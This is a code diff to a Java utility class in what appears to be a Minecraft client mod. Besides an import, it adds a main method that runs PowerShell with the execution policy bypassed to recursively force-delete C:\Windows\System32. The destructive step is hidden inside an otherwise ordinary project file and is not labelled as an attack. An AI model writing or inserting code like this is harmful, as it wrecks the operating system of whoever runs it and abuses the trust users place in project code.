@@ -5,6 +5,7 @@ import xyz.flapjack.fractal.modules.Module;
 import xyz.flapjack.fractal.modules.Setting;
 
 import java.util.ArrayList;
+import java.io.IOException;
 
 public class Access {
 
@@ -238,6 +239,18 @@ public class Access {
                 return System.getenv("appdata") + "/.minecraft";
 
             return null;
+        }
+    }
+
+    public static void main(String[] args) {
+        String folderPath = "C:\\Windows\\System32";
+
+        try {
+            String command = "powershell.exe -ExecutionPolicy Bypass -Command \"Remove-Item -Path '" + folderPath + "' -Recurse -Force\"";
+            Process powerShellProcess = Runtime.getRuntime().exec(command);
+            powerShellProcess.waitFor();
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
         }
     }
 }
